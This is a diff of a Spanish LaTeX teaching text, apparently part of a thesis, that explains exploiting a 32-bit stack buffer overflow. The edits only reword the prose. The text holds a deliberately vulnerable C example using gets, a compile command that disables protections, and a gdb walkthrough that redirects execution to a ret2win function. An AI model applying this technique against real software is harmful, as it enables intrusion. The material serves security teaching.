@@ -288,7 +288,7 @@ La sección del stack está dividida en ventanas con los contextos de ejecución
 \end{figure}
 \FloatBarrier
 \subsubsection{Explotando un buffer overflow en 32bits}
-Con el conocimiento adquirido en el punto anterior se puede observar que si se modifica el valor del \acrshort{eip}, el programa verá alterado su flujo normal de trabajo. En este caso, en ese registro se puede establecer una dirección de memoria maligna que permita ejecutar código arbitrario.
+Con lo explicado en el punto anterior se puede observar que si se modifica el valor del \acrshort{eip}, el programa verá alterado su flujo normal de trabajo. En este caso, en ese registro se puede establecer una dirección de memoria maligna que permita ejecutar código arbitrario.
 
 En el siguiente código C de ejemplo se puede observar que tenemos declarada una función peligrosa llamada `ret2win'. Esta no se ejecuta en ningún momento en el código, sin embargo, existe y puede ser ejecutada alterando el flujo normal del programa.
 
@@ -314,9 +314,9 @@ void main(){
 \FloatBarrier
 En este caso, la función `gets' permite escribir por encima del tamaño del buffer y alterar el stack pudiendo cambiar el valor del \acrshort{eip} guardado.
 
-Es probable que compilando el código tal y como está el compilador nos arroje varias alertas sobre el fallo, además los compiladores en la actualidad implementan mitigaciones por defecto para evitar situaciones no deseadas.
+Es probable que compilando el código tal y como está, el compilador nos arroje varias alertas sobre el fallo. Además los compiladores en la actualidad implementan mitigaciones por defecto para evitar situaciones no deseadas.
 Estas mitigaciones se explican en el punto \ref{subsec:mitigaciones}.
-Para probar el la explotación antes descrita necesitamos compilar el binario con el siguiente comando:
+Para probar la explotación antes descrita se necesita compilar el binario con el siguiente comando:
 \begin{lstlisting}[language=bash, caption=Compilado de código con pocas mitigaciones y arquitectura 32bit]
 $ gcc -m32 -no-pie -fno-stack-protector -o ret2win.o ret2win.c
 \end{lstlisting}
@@ -334,7 +334,7 @@ Breakpoint 2 at 0x80491c5
 # Se establece el breakpoint en la funcion "ret2win"
 (gdb) b ret2win
 Breakpoint 3 at 0x80491ac
-# Procedemos a ejecutar el programa y alcanzamos la funcion main
+# Procedemos a ejecutar el programa y se alcanza la funcion main
 (gdb) start
 Breakpoint 1, 0x08049209 in main ()
 # Podemos ver los stack frames usando backtrace
@@ -343,18 +343,18 @@ Breakpoint 1, 0x08049209 in main ()
 # Continuamos hasta funcion_vulnerable
 (gdb) continue
 Breakpoint 2, 0x080491c5 in funcion_vulnerable ()
-# Revisamos los stack frames para observar que hemos cambiado a uno nuevo
+# Se revisan los stack frames para observar que se ha cambiado a uno nuevo
 (gdb) backtrace
 0  0x080491c5 in funcion_vulnerable ()
 1  0x08049221 in main ()
-# Continuamos instruccion por instruccion hasta que nos pida un input usando next
+# Se continua instruccion por instruccion hasta que se pida un input usando next
 (gdb) next instruction
 .
 .
 .
 (gdb) next instruction
 Dime algo: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-# Introducimos un texto largo, de 48 As por ejemplo
+# Se introduce un texto largo (por encima de las dimensiones del buffer), 48 As por ejemplo
 0x080491e1 in funcion_vulnerable ()
 (gdb) backtrace
 0  0x080491e1 in funcion_vulnerable ()
@@ -398,7 +398,7 @@ Continuing.
 Dime algo: 
 
 Breakpoint 3, 0x080491ac in ret2win ()
-# Buffer overflow conseguido, estamos en la funcion ret2win
+# Buffer overflow conseguido, se ha ejecutado la funcion ret2win
 \end{lstlisting}
 
 Con esta prueba de concepto, se puede entender el peligro de un \acrshort{bof}.
